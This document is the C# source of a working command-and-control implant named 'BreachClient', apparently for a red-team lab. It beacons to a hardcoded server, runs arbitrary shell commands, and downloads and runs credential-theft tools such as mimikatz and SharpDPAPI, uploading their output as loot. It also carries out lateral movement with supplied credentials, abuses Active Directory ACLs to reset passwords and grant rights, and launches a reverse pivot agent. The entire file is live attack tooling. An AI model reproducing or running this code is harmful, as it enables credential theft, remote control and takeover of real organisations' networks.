using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace BreachClient
{
    class Program
    {
        private static readonly HttpClient http = new HttpClient();
        private static readonly string ServerId = "http://192.168.10.4:8080";
        private static readonly string AgentId = "AGENT_001"; // Set this before compiling — must be unique per target
        private static readonly int BeaconInterval = 5000; // ms

        static async Task Main(string[] args)
        {
            while (true)
            {
                try
                {
                    await Checkin();
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[-] Beacon error: {e.Message}");
                }

                await Task.Delay(BeaconInterval);
            }
        }

        static string GetLocalIP()
        {
            try
            {
                using var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                socket.Connect("8.8.8.8", 65530);
                return ((IPEndPoint)socket.LocalEndPoint!).Address.ToString();
            }
            catch { return ""; }
        }

        static async Task Checkin()
        {
            var payload = JsonSerializer.Serialize(new
            {
                agent_id = AgentId,
                hostname = Environment.MachineName,
                username = Environment.UserName,
                ip       = GetLocalIP()
            });

            var response = await http.PostAsync(
                $"{ServerId}/checkin",
                new StringContent(payload, Encoding.UTF8, "application/json")
            );

            var body = await response.Content.ReadAsStringAsync();
            var doc = JsonDocument.Parse(body).RootElement;

            if (doc.TryGetProperty("task_id", out var taskIdEl) &&
                taskIdEl.ValueKind != JsonValueKind.Null)
            {
                int taskId = taskIdEl.GetInt32();
                string taskType   = doc.GetProperty("task_type").GetString()!;
                string instruction = doc.GetProperty("instruction").GetString()!;

                string output = taskType switch
                {
                    "recon"        => await RunRecon(instruction),
                    "sharphound"   => await RunSharpHound(instruction),
                    "certipy"      => await RunCertipy(instruction),
                    "secretsdump"  => await RunDownloadAndExec(instruction),
                    "dpapi"        => await RunDownloadAndExec(instruction),
                    "authenticate" => RunAuthenticate(instruction),
                    "aclabuse"     => RunAclAbuse(instruction),
                    "pivot"        => await RunPivotAgent(instruction),
                    _              => ExecuteCommand(instruction)
                };

                await PostResult(taskId, output);
            }
        }

        // ── Shell execution ───────────────────────────────────────────────────

        static string ExecuteCommand(string instruction)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = "cmd.exe",
                    Arguments              = $"/c {instruction}",
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };

                using var proc = Process.Start(psi)!;
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                return string.IsNullOrWhiteSpace(stderr) ? stdout : stdout + "\n[stderr] " + stderr;
            }
            catch (Exception e)
            {
                return $"[exec error] {e.Message}";
            }
        }

        // ── Tool download / upload helpers ────────────────────────────────────

        /// <summary>Download a tool from /files/<toolName> and save it to %TEMP%.</summary>
        static async Task<string?> DownloadTool(string toolName)
        {
            try
            {
                var resp = await http.GetAsync($"{ServerId}/files/{toolName}");
                if (!resp.IsSuccessStatusCode)
                    return null;

                string dest = Path.Combine(Path.GetTempPath(), toolName);
                var bytes = await resp.Content.ReadAsByteArrayAsync();
                await File.WriteAllBytesAsync(dest, bytes);
                return dest;
            }
            catch
            {
                return null;
            }
        }

        /// <summary>Upload a file from the agent back to the server's /upload endpoint.</summary>
        static async Task UploadFile(string filePath)
        {
            try
            {
                using var form = new MultipartFormDataContent();
                form.Add(new StringContent(AgentId), "agent_id");

                var bytes = await File.ReadAllBytesAsync(filePath);
                form.Add(new ByteArrayContent(bytes), "file", Path.GetFileName(filePath));

                await http.PostAsync($"{ServerId}/upload", form);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Upload failed: {e.Message}");
            }
        }

        // ── SharpHound module ─────────────────────────────────────────────────

        /// <summary>
        /// Download SharpHound.exe from the server, run it in a temp working directory,
        /// upload any ZIP files it produces back to the server, then return stdout.
        ///
        /// Instruction: SharpHound CLI args (e.g. "-d ICCN.LOCAL --CollectionMethods All")
        /// Leave empty to use SharpHound defaults.
        /// </summary>
        static async Task<string> RunSharpHound(string args)
        {
            string? toolPath = await DownloadTool("SharpHound.exe");
            if (toolPath == null)
                return "[error] Failed to download SharpHound.exe from server";

            // Run in a dedicated temp directory so ZIP output is easy to find
            string workDir = Path.Combine(Path.GetTempPath(), "sh_" + Guid.NewGuid().ToString("N")[..8]);
            Directory.CreateDirectory(workDir);

            string shPath = Path.Combine(workDir, "SharpHound.exe");
            File.Copy(toolPath, shPath, overwrite: true);

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = shPath,
                    Arguments              = string.IsNullOrWhiteSpace(args) ? "--zipfilename loot" : args,
                    WorkingDirectory       = workDir,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };

                using var proc = Process.Start(psi)!;
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                // Upload every ZIP SharpHound produced
                var zips = Directory.GetFiles(workDir, "*.zip");
                foreach (var zip in zips)
                    await UploadFile(zip);

                string result = string.IsNullOrWhiteSpace(stderr)
                    ? stdout
                    : stdout + "\n[stderr] " + stderr;

                return result.Trim() + $"\n[+] Uploaded {zips.Length} ZIP file(s) to server";
            }
            finally
            {
                try { Directory.Delete(workDir, recursive: true); } catch { }
            }
        }

        // ── Certipy module (ADCS enumeration) ────────────────────────────────

        /// <summary>
        /// Download certipy.exe from the server, run it in a temp working directory,
        /// upload any output files it produces (.json, .txt, .zip), then return stdout.
        ///
        /// Instruction: certipy subcommand + args
        ///   e.g. "find -u administrator@corp.local -p Password123 -dc-ip 10.0.0.1"
        ///        "find -u administrator@corp.local -hashes :aad3b435b51404eeaad3b435b51404ee:... -dc-ip 10.0.0.1"
        /// </summary>
        static async Task<string> RunCertipy(string args)
        {
            string? toolPath = await DownloadTool("certipy.exe");
            if (toolPath == null)
                return "[error] Failed to download certipy.exe from server";

            string workDir = Path.Combine(Path.GetTempPath(), "cp_" + Guid.NewGuid().ToString("N")[..8]);
            Directory.CreateDirectory(workDir);

            string cpPath = Path.Combine(workDir, "certipy.exe");
            File.Copy(toolPath, cpPath, overwrite: true);

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = cpPath,
                    Arguments              = args,
                    WorkingDirectory       = workDir,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };

                using var proc = Process.Start(psi)!;
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                // Upload all output files certipy produced (.json, .txt, .zip)
                var outputFiles = Directory.GetFiles(workDir)
                    .Where(f => !f.EndsWith("certipy.exe", StringComparison.OrdinalIgnoreCase))
                    .ToArray();
                foreach (var f in outputFiles)
                    await UploadFile(f);

                string result = string.IsNullOrWhiteSpace(stderr)
                    ? stdout
                    : stdout + "\n[stderr] " + stderr;

                return result.Trim() + $"\n[+] Uploaded {outputFiles.Length} output file(s) to server";
            }
            finally
            {
                try { Directory.Delete(workDir, recursive: true); } catch { }
            }
        }

        // ── Generic tool execution (secretsdump, dpapi, …) ───────────────────

        /// <summary>
        /// Download a tool from /files/ and run it. The instruction format is:
        ///   "toolname.exe [args...]"
        /// The first token is the filename to download; the rest are passed as arguments.
        ///
        /// Examples:
        ///   "mimikatz.exe sekurlsa::logonpasswords exit"
        ///   "SharpDPAPI.exe triage"
        /// </summary>
        static async Task<string> RunDownloadAndExec(string instruction)
        {
            var parts    = instruction.Split(' ', 2, StringSplitOptions.RemoveEmptyEntries);
            string tool  = parts[0];
            string tArgs = parts.Length > 1 ? parts[1] : "";

            string? toolPath = await DownloadTool(tool);
            if (toolPath == null)
                return $"[error] Failed to download {tool} from server";

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = toolPath,
                    Arguments              = tArgs,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };

                using var proc = Process.Start(psi)!;
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                return string.IsNullOrWhiteSpace(stderr) ? stdout : stdout + "\n[stderr] " + stderr;
            }
            catch (Exception e)
            {
                return $"[exec error] {e.Message}";
            }
        }

        // ── Authentication / lateral movement ────────────────────────────────────

        /// <summary>
        /// Authenticate to a remote host using a native Windows service.
        /// Instruction format: "username|password|target|service[|command]"
        /// Services: winrm (winrs), smb (net use), wmi (wmic)
        /// Optional command overrides the default probe for winrm and wmi.
        /// </summary>
        static string RunAuthenticate(string instruction)
        {
            var parts = instruction.Split('|');
            if (parts.Length < 4)
                return "[error] Invalid authenticate instruction — expected: user|password|target|service[|command]";

            string username = parts[0];
            string password = parts[1];
            string target   = parts[2];
            string service  = parts[3].ToLower();
            string? command = parts.Length >= 5 ? parts[4] : null;

            return service switch
            {
                "smb" => RunSmbAuth(username, password, target, command),
                "wmi" => RunWmiAuth(username, password, target, command),
                _     => RunWinrmAuth(username, password, target, command)
            };
        }

        /// <summary>
        /// WinRM — run a remote command via winrs.
        /// Defaults to whoami/hostname/ipconfig probe when no command is specified.
        /// </summary>
        static string RunWinrmAuth(string username, string password, string target, string? command)
        {
            string cmd = string.IsNullOrWhiteSpace(command)
                ? "whoami && hostname && ipconfig"
                : command;
            return ExecuteCommand(
                $"winrs -r:http://{target}:5985 -u:{username} -p:{password} cmd /c \"{cmd}\""
            );
        }

        /// <summary>
        /// SMB — authenticate via IPC$, list shares, then clean up.
        /// If a command is specified, a note is returned — SMB auth does not support remote exec.
        /// </summary>
        static string RunSmbAuth(string username, string password, string target, string? command)
        {
            // Clean up any existing session first to avoid "multiple connections" error
            ExecuteCommand($"net use \\\\{target}\\IPC$ /delete /yes 2>nul");

            string connect = ExecuteCommand($"net use \\\\{target}\\IPC$ \"{password}\" /user:{username}");

            bool failed = connect.Contains("error", StringComparison.OrdinalIgnoreCase)
                       || connect.Contains("Access is denied", StringComparison.OrdinalIgnoreCase)
                       || connect.Contains("invalid", StringComparison.OrdinalIgnoreCase)
                       || connect.Contains("incorrect", StringComparison.OrdinalIgnoreCase)
                       || connect.Contains("denied", StringComparison.OrdinalIgnoreCase);

            if (failed)
            {
                ExecuteCommand($"net use \\\\{target}\\IPC$ /delete /yes 2>nul");
                return connect.Trim();
            }

            string shares = ExecuteCommand($"net view \\\\{target}");
            ExecuteCommand($"net use \\\\{target}\\IPC$ /delete /yes");

            string result = connect.Trim() + "\n" + shares.Trim();
            if (!string.IsNullOrWhiteSpace(command))
                result += "\n[note] SMB auth does not support -c; use winrm or wmi for remote execution";
            return result;
        }

        /// <summary>
        /// WMI — run a remote command via wmic process call create, or list processes as a default probe.
        /// Note: process call create does not capture stdout; output shows PID and return value only.
        /// </summary>
        static string RunWmiAuth(string username, string password, string target, string? command)
        {
            if (!string.IsNullOrWhiteSpace(command))
            {
                // Escape double quotes inside the command
                string escaped = command.Replace("\"", "\\\"");
                return ExecuteCommand(
                    $"wmic /node:{target} /user:{username} /password:\"{password}\" process call create \"{escaped}\""
                );
            }
            return ExecuteCommand(
                $"wmic /node:{target} /user:{username} /password:\"{password}\" process list brief"
            );
        }

        // ── ACL abuse module ──────────────────────────────────────────────────────

        /// <summary>
        /// Execute an Active Directory ACL abuse operation via PowerShell ADSI.
        /// Instruction wire format: "op|arg1|arg2[|arg3]"
        ///   addmember           group|user
        ///   forcechangepassword user|newpassword
        ///   genericwrite        target_sam|attribute|value
        ///   writedacl           target_sam|principal_sam|right
        ///   writeowner          target_sam|new_owner_sam
        /// </summary>
        static string RunAclAbuse(string instruction)
        {
            var parts = instruction.Split('|');
            if (parts.Length < 2)
                return "[error] Invalid aclabuse instruction — expected: op|arg1|arg2...";

            return parts[0].ToLower() switch
            {
                "addmember"           => AclAddMember(parts),
                "forcechangepassword" => AclForceChangePassword(parts),
                "genericwrite"        => AclGenericWrite(parts),
                "writedacl"           => AclWriteDacl(parts),
                "writeowner"          => AclWriteOwner(parts),
                _                     => $"[error] Unknown ACL abuse operation: {parts[0]}"
            };
        }

        /// <summary>
        /// Run a PowerShell script via -EncodedCommand (UTF-16 LE base64) to avoid
        /// any cmd.exe escaping issues. Returns combined stdout / stderr.
        /// </summary>
        static string RunPowerShell(string script)
        {
            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
            var psi = new ProcessStartInfo
            {
                FileName               = "powershell.exe",
                Arguments              = $"-NoProfile -NonInteractive -EncodedCommand {b64}",
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true,
            };
            using var proc = Process.Start(psi)!;
            string stdout = proc.StandardOutput.ReadToEnd();
            string stderr = proc.StandardError.ReadToEnd();
            proc.WaitForExit();
            return string.IsNullOrWhiteSpace(stderr) ? stdout : stdout + "\n[stderr] " + stderr;
        }

        // addmember|<group>|<user>
        static string AclAddMember(string[] p)
        {
            if (p.Length < 3) return "[error] addmember: requires group|user";
            return ExecuteCommand($"net group \"{p[1]}\" \"{p[2]}\" /add /domain");
        }

        // forcechangepassword|<user>|<newpassword>
        static string AclForceChangePassword(string[] p)
        {
            if (p.Length < 3) return "[error] forcechangepassword: requires user|newpassword";
            string script = string.Format(
                @"$u = ([adsisearcher]'(sAMAccountName={0})').FindOne().GetDirectoryEntry()
$u.Invoke('SetPassword', '{1}')
$u.CommitChanges()
'[+] Password changed for {0}'",
                p[1], p[2]);
            return RunPowerShell(script);
        }

        // genericwrite|<target_sam>|<attribute>|<value>
        // Writes a string attribute on any AD object (user, group, computer).
        // Common targets: scriptPath, servicePrincipalName, msDS-KeyCredentialLink
        static string AclGenericWrite(string[] p)
        {
            if (p.Length < 4) return "[error] genericwrite: requires target|attribute|value";
            string script = string.Format(
                @"$obj = ([adsisearcher]'(sAMAccountName={0})').FindOne().GetDirectoryEntry()
$obj.Put('{1}', '{2}')
$obj.CommitChanges()
'[+] Wrote {1}={2} on {0}'",
                p[1], p[2], p[3]);
            return RunPowerShell(script);
        }

        // writedacl|<target_sam>|<principal_sam>|<right>
        // Grants an ActiveDirectoryRights right to principal over target.
        // Common rights: GenericAll, GenericWrite, WriteDacl, WriteOwner, ResetPassword
        static string AclWriteDacl(string[] p)
        {
            if (p.Length < 4) return "[error] writedacl: requires target|principal|right";
            string script = string.Format(
                @"$tgt = ([adsisearcher]'(sAMAccountName={0})').FindOne().GetDirectoryEntry()
$prin = ([adsisearcher]'(sAMAccountName={1})').FindOne()
$sid = New-Object System.Security.Principal.SecurityIdentifier($prin.Properties['objectSid'][0], 0)
$right = [System.DirectoryServices.ActiveDirectoryRights]::{2}
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, $right, [System.Security.AccessControl.AccessControlType]::Allow)
$tgt.ObjectSecurity.AddAccessRule($ace)
$tgt.CommitChanges()
'[+] Granted {2} to {1} over {0}'",
                p[1], p[2], p[3]);
            return RunPowerShell(script);
        }

        // writeowner|<target_sam>|<new_owner_sam>
        // Takes ownership of an AD object — typically followed by writedacl GenericAll.
        static string AclWriteOwner(string[] p)
        {
            if (p.Length < 3) return "[error] writeowner: requires target|new_owner";
            string script = string.Format(
                @"$tgt = ([adsisearcher]'(sAMAccountName={0})').FindOne().GetDirectoryEntry()
$own = ([adsisearcher]'(sAMAccountName={1})').FindOne()
$sid = New-Object System.Security.Principal.SecurityIdentifier($own.Properties['objectSid'][0], 0)
$tgt.ObjectSecurity.SetOwner($sid)
$tgt.CommitChanges()
'[+] Ownership of {0} set to {1}'",
                p[1], p[2]);
            return RunPowerShell(script);
        }

        // ── Pivot / ligolo-ng agent deployment ───────────────────────────────────

        /// <summary>
        /// Download agent.exe from /files/ and launch it detached so it connects
        /// back to the ligolo-ng proxy on the operator machine.
        /// Instruction format: "ip:port"  (e.g. "192.168.10.4:11601")
        /// The process runs in the background — the beacon loop continues normally.
        /// </summary>
        static async Task<string> RunPivotAgent(string connectAddr)
        {
            string? agentPath = await DownloadTool("agent.exe");
            if (agentPath == null)
                return "[error] Failed to download agent.exe — place it in server/files/";

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName        = agentPath,
                    Arguments       = $"-connect {connectAddr} -ignore-cert",
                    UseShellExecute = false,
                    CreateNoWindow  = true,
                };
                var proc = Process.Start(psi)!;
                return $"[+] ligolo-ng agent started (PID {proc.Id}), connecting to {connectAddr}";
            }
            catch (Exception e)
            {
                return $"[exec error] {e.Message}";
            }
        }

        // ── Lateral movement (disabled — re-enable when BH integration is ready) ──
        //
        // static async Task<string> RunLateralMovement(string instruction)
        // {
        //     // Planned: parse BloodHound-derived action (e.g. ChangePassword, AddMember)
        //     // and execute via native Windows commands or downloaded tooling.
        //     // instruction format TBD once Graph Logic Engine is built.
        //     return "[disabled] Lateral movement module not yet enabled";
        // }

        // ── Recon engine ──────────────────────────────────────────────────────

        static readonly int[] CommonPorts = { 21, 22, 23, 25, 80, 135, 139, 443, 445, 3389, 5985, 5986, 8080, 8443 };
        static readonly int PingTimeout   = 1000; // ms
        static readonly int PortTimeout   = 500;  // ms
        static readonly int BannerTimeout = 1000; // ms

        static async Task<string> RunRecon(string target)
        {
            var ips = ExpandTarget(target);

            // Parallel ping sweep
            var pingTasks = ips.Select(ip => PingHostAsync(ip)).ToArray();
            await Task.WhenAll(pingTasks);

            var aliveHosts = ips
                .Zip(pingTasks, (ip, t) => (ip, alive: t.Result))
                .Where(x => x.alive)
                .Select(x => x.ip)
                .ToList();

            // Scan alive hosts in parallel (fully async — no blocking threads)
            var hostTasks = aliveHosts.Select(async ip =>
            {
                string hostname = await ResolveHostnameAsync(ip);
                var portTasks   = CommonPorts.Select(p => ScanPortAsync(ip, p));
                var portResults = await Task.WhenAll(portTasks);
                var ports = portResults
                    .Where(r => r.HasValue)
                    .Select(r => new { port = r!.Value.port, service = r.Value.service, banner = r.Value.banner })
                    .ToList();
                return new { ip, hostname, ports };
            });
            var hosts = await Task.WhenAll(hostTasks);

            string json = JsonSerializer.Serialize(new { target, hosts });

            // Write to a temp file and upload to loot
            string fileName = $"recon_{DateTime.UtcNow:yyyyMMdd_HHmmss}.json";
            string tempPath = Path.Combine(Path.GetTempPath(), fileName);
            try
            {
                await File.WriteAllTextAsync(tempPath, json);
                await UploadFile(tempPath);
            }
            finally
            {
                try { File.Delete(tempPath); } catch { }
            }

            return json;
        }

        static async Task<string> ResolveHostnameAsync(string ip)
        {
            try
            {
                using var cts = new System.Threading.CancellationTokenSource(2000);
                var entry = await Dns.GetHostEntryAsync(ip, cts.Token);
                return entry.HostName;
            }
            catch { return ""; }
        }

        static async Task<(int port, string service, string banner)?> ScanPortAsync(string ip, int port)
        {
            try
            {
                using var tcp = new TcpClient();
                using var cts = new System.Threading.CancellationTokenSource(PortTimeout);
                await tcp.ConnectAsync(ip, port, cts.Token);

                string banner  = await GrabBannerAsync(tcp, ip, port);
                string service = GetServiceName(port, banner);
                return (port, service, banner);
            }
            catch { return null; }
        }

        static async Task<string> GrabBannerAsync(TcpClient tcp, string ip, int port)
        {
            // Skip banner grab for binary/SSL protocols
            if (port == 135 || port == 139 || port == 443 || port == 3389 || port == 5986 || port == 8443)
                return "";
            try
            {
                using var cts    = new System.Threading.CancellationTokenSource(BannerTimeout);
                var stream       = tcp.GetStream();

                if (port == 80 || port == 8080)
                {
                    var req = Encoding.ASCII.GetBytes($"HEAD / HTTP/1.0\r\nHost: {ip}\r\n\r\n");
                    await stream.WriteAsync(req, cts.Token);
                }

                var buf = new byte[512];
                int n = await stream.ReadAsync(buf, cts.Token);
                return new string(Encoding.ASCII.GetString(buf, 0, n)
                    .Where(c => c >= 32 || c == '\n' || c == '\r')
                    .ToArray()).Trim();
            }
            catch { return ""; }
        }

        static string GetServiceName(int port, string banner)
        {
            if (banner.StartsWith("SSH-"))
                return $"SSH ({banner.Split('\n')[0].Trim()})";
            if (banner.StartsWith("220") && port == 21)
                return $"FTP ({banner.Split('\n')[0].Trim()})";
            if (banner.StartsWith("220") && port == 25)
                return $"SMTP ({banner.Split('\n')[0].Trim()})";
            if (banner.StartsWith("HTTP/") || banner.Contains("Server:"))
            {
                var srv = banner.Split('\n').FirstOrDefault(l => l.StartsWith("Server:"));
                return srv != null ? $"HTTP ({srv[7..].Trim()})" : "HTTP";
            }
            if (banner.StartsWith("230") || banner.StartsWith("331")) return "FTP";
            if (banner.StartsWith("+OK")) return "POP3";

            return port switch
            {
                21   => "FTP",
                22   => "SSH",
                23   => "Telnet",
                25   => "SMTP",
                80   => "HTTP",
                135  => "MSRPC",
                139  => "NetBIOS",
                443  => "HTTPS",
                445  => "SMB",
                3389 => "RDP",
                5985 => "WinRM-HTTP",
                5986 => "WinRM-HTTPS",
                8080 => "HTTP-Alt",
                8443 => "HTTPS-Alt",
                _    => "unknown"
            };
        }

        static List<string> ExpandTarget(string target)
        {
            var ips = new List<string>();

            if (target.Contains('/'))
            {
                var parts  = target.Split('/');
                int prefix = int.Parse(parts[1]);
                var baseIp = IPAddress.Parse(parts[0]);
                byte[] bytes = baseIp.GetAddressBytes();

                if (prefix < 8 || prefix > 30)
                    return ips;

                uint ipInt    = (uint)(bytes[0] << 24 | bytes[1] << 16 | bytes[2] << 8 | bytes[3]);
                uint mask      = prefix == 0 ? 0 : 0xFFFFFFFF << (32 - prefix);
                uint network   = ipInt & mask;
                uint broadcast = network | ~mask;

                for (uint i = network + 1; i < broadcast; i++)
                {
                    byte[] b = new byte[4];
                    b[0] = (byte)(i >> 24);
                    b[1] = (byte)(i >> 16);
                    b[2] = (byte)(i >> 8);
                    b[3] = (byte)(i);
                    ips.Add(new IPAddress(b).ToString());
                }
            }
            else
            {
                ips.Add(target);
            }

            return ips;
        }

        static async Task<bool> PingHostAsync(string ip)
        {
            try
            {
                using var ping = new Ping();
                var reply = await ping.SendPingAsync(ip, PingTimeout);
                return reply.Status == IPStatus.Success;
            }
            catch
            {
                return false;
            }
        }

        // ── Result posting ────────────────────────────────────────────────────

        static async Task PostResult(int taskId, string output)
        {
            var payload = JsonSerializer.Serialize(new
            {
                task_id  = taskId,
                agent_id = AgentId,
                output   = output
            });

            var response = await http.PostAsync(
                $"{ServerId}/result",
                new StringContent(payload, Encoding.UTF8, "application/json")
            );

            if (!response.IsSuccessStatusCode)
                Console.WriteLine($"[-] Failed to post result: {response.StatusCode}");
        }
    }
}
